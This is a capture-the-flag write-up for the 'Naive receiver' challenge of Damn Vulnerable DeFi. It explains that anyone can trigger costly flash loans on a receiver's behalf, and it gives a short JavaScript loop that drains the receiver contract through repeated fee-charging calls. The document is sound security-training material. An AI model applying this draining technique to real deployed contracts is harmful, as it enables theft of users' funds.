# Challenge #2 - Naive receiver

Challenge #2 - Naive receiver

There's a lending pool offering quite expensive flash loans of Ether, which has 1000 ETH in balance.

You also see that a user has deployed a contract with 10 ETH in balance, capable of interacting with the lending pool and receiveing flash loans of ETH.

Drain all ETH funds from the user's contract. Doing it in a single transaction is a big plus ;)

    [See the contracts](https://github.com/tinchoabbate/damn-vulnerable-defi/tree/v2.2.0/contracts/naive-receiver)
    [Complete the challenge](https://github.com/tinchoabbate/damn-vulnerable-defi/blob/v2.2.0/test/naive-receiver/naive-receiver.challenge.js)

# Solution

The flashloans fees are very expensive, and the pool has no protector against 3rd party attackers calling the flashloan function.

The solution is to call the flashloan function on behalf of the user.

```js
while ((await ethers.provider.getBalance(this.receiver.address)).toString() > 0) {
    await this.pool.flashLoan(this.receiver.address, ETHER_IN_RECEIVER)
}
```
